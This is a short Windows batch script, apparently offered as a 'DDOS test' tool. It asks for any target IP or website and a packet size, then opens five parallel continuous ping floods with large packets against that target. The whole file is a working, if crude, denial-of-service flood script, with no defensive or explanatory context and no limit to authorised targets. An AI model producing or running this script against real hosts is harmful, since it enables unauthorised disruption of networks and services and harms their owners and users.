@echo off

@echo Input IP/website to DDOS test:
set /p ip="IP~$ "

@echo Input size of packets:
set /p packetSize="packetSize~$ "

@echo DDOS testing %ip% with %packetSize% byte sized packets.

for %%a in (0,1,2,3,4) do start ping -t -l %packetSize% %ip%

